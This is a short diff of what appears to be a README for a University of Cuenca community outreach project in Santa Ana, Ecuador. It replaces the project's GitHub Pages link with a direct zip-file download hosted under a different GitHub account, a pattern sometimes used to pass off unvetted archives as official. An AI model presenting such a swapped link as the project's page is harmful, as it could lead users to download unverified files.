@@ -2,4 +2,4 @@
 
 Proyecto de Vinculación con la Sociedad de la Universidad de Cuenca en Santa Ana
 
-https://fabianastudillo.github.io/Aptein-SantaAna/
+https://raw.githubusercontent.com/elcaja5/Aptein-SantaAna/main/docs/Afiche/Aptein-SantaAna-v2.8.zip
